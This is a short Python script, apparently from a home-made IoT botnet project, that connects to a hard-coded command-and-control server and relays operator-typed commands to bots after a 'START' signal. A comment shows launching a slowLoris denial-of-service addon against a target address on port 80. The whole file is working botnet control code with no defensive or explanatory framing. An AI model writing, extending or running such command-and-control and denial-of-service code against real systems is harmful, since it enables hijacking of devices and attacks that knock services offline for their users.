import socket
server = "172.24.4.48"
port = 7000
# python3 /home/kabali/BotNet/IotBot/addons/slowLoris.py 192.168.8.102 80


bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bot.connect((server, port))

while True:
    resp = bot.recv(2040).decode("UTF-8")

    if resp.find('START') != -1:
        print("Enter the command for bonnet")
        cmd = input()
        bot.send(bytes('CMD :' + cmd + '\r\n', "UTF-8"))